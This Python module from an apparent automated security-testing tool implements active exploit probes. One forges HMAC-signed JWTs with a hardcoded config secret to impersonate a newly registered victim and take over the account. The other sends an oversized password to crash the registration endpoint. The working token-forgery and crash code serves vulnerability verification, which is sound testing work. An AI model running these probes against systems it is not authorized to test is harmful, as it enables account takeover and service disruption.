"""
execution/probes.py — Active exploit probes
============================================
QAX's runner could only send HTTP requests and click UI. Some bugs need MORE than
that to prove — forging a token with a leaked secret, or crashing an endpoint with
oversized input. Probes are that broader execution vocabulary: each actively tries
an exploit and returns hard evidence when it works.

The crown jewel is forge_jwt: it signs a JWT with the secret the AppModel found
hardcoded in config and uses it to impersonate a freshly-registered victim — the
critical bug QAX was structurally unable to reach. Signing is pure stdlib HMAC (no
new dependency), covering the symmetric HS256/384/512 algorithms a hardcoded secret
implies.

All probes are best-effort and never raise to the caller.
"""

from __future__ import annotations

import base64
import hashlib
import hmac
import json
import logging
import time
import uuid

import requests

from services.results import ProbeFinding

logger = logging.getLogger(__name__)

_HASHES = {"HS256": hashlib.sha256, "HS384": hashlib.sha384, "HS512": hashlib.sha512}


def _b64(data: bytes) -> bytes:
    return base64.urlsafe_b64encode(data).rstrip(b"=")


def sign_jwt_hs(secret: str, algorithm: str, claims: dict) -> str | None:
    """Sign a JWT with an HMAC (symmetric) algorithm using only the stdlib."""
    hasher = _HASHES.get((algorithm or "HS256").upper())
    if hasher is None:
        return None
    header = _b64(json.dumps({"alg": algorithm.upper(), "typ": "JWT"},
                             separators=(",", ":")).encode())
    payload = _b64(json.dumps(claims, separators=(",", ":")).encode())
    signing_input = header + b"." + payload
    sig = _b64(hmac.new(secret.encode(), signing_input, hasher).digest())
    return (signing_input + b"." + sig).decode()


def _jwt_algorithm(model) -> str:
    """Read the JWT algorithm from the model's config, defaulting to HS256."""
    for c in getattr(model, "config", []):
        if isinstance(c, dict) and "algorithm" in str(c.get("key", "")).lower():
            return str(c.get("default") or "HS256")
    return "HS256"


def forge_jwt_probe(model, base_url: str, *, session: requests.Session | None = None) -> ProbeFinding | None:
    """
    Try to forge a JWT with the hardcoded secret and impersonate a victim.

    Returns a ProbeFinding (exploited=True on success), or None when there is no
    hardcoded secret to forge with.
    """
    sess = session or requests.Session()

    secret = None
    for s in getattr(model, "exposed_secrets", []):
        if any(k in str(s.get("key", "")).lower() for k in ("jwt", "secret", "sign", "token", "key")):
            secret = s.get("default")
            break
    if not secret:
        return None

    algorithm = _jwt_algorithm(model)
    if not algorithm.upper().startswith("HS"):
        return ProbeFinding(probe="forge-jwt", title="JWT uses an asymmetric algorithm",
                            exploited=False, severity="P1",
                            evidence=f"algorithm {algorithm} — a config secret is not the signing key",
                            target="auth")

    from core.auth_recipe import derive_auth_recipe, subject_candidates
    recipe = derive_auth_recipe(model)
    register = recipe["register_path"]
    identity = recipe["identity_path"]
    base = base_url.rstrip("/")
    victim = f"victim_{uuid.uuid4().hex[:8]}@example.com"

    reg_response = None
    try:
        rr = sess.post(f"{base}{register}",
                       json={recipe["id_field"]: victim, recipe["secret_field"]: "Str0ngPass!23"},
                       timeout=15)
        try:
            reg_response = rr.json()
        except Exception:
            reg_response = None
    except Exception as exc:  # pragma: no cover - network
        logger.warning("forge_jwt: victim register failed: %s", exc)

    exp = int(time.time()) + 3600
    for sub in subject_candidates(victim, reg_response):
        token = sign_jwt_hs(secret, algorithm, {"sub": sub, "exp": exp})
        if not token:
            continue
        try:
            r = sess.get(f"{base}{identity}", headers={"Authorization": f"Bearer {token}"}, timeout=15)
        except Exception as exc:  # pragma: no cover - network
            logger.warning("forge_jwt: identity call failed: %s", exc)
            continue
        if r.status_code == 200 and victim in r.text:
            return ProbeFinding(
                probe="forge-jwt",
                title="JWT forgery → full account takeover",
                exploited=True, severity="P1",
                evidence=(f"Forged a token for {victim} with the hardcoded secret "
                          f"{str(secret)[:24]!r} (alg {algorithm}); GET {identity} returned 200 with "
                          f"the victim's data — no password needed."),
                target=identity)

    return ProbeFinding(probe="forge-jwt", title="JWT forgery attempt did not succeed",
                        exploited=False, severity="P1",
                        evidence="forged token was rejected (secret/subject/alg did not match)",
                        target=identity)


def crash_fuzz_probe(model, base_url: str, *, session: requests.Session | None = None) -> list[ProbeFinding]:
    """Send oversized inputs to auth endpoints and flag any 5xx (unhandled crash)."""
    sess = session or requests.Session()
    from core.auth_recipe import derive_auth_recipe
    recipe = derive_auth_recipe(model)
    register = recipe["register_path"]
    base = base_url.rstrip("/")
    out: list[ProbeFinding] = []

    # 100 chars: over bcrypt's 72-byte limit but within a typical 128 schema max,
    # so validation accepts it and the crash surfaces at the hashing step.
    big_password = "A" * 100
    try:
        r = sess.post(f"{base}{register}",
                      json={recipe["id_field"]: f"fuzz_{uuid.uuid4().hex[:8]}@example.com",
                            recipe["secret_field"]: big_password},
                      timeout=15)
        if r.status_code >= 500:
            out.append(ProbeFinding(
                probe="crash-fuzz", title="Server error (5xx) on oversized password",
                exploited=True, severity="P2",
                evidence=f"POST {register} with a {len(big_password)}-char password → HTTP "
                         f"{r.status_code} (valid per the schema's max length; exceeds the hashing "
                         f"library's 72-byte limit)",
                target=register))
    except Exception as exc:  # pragma: no cover - network
        logger.warning("crash_fuzz failed: %s", exc)
    return out
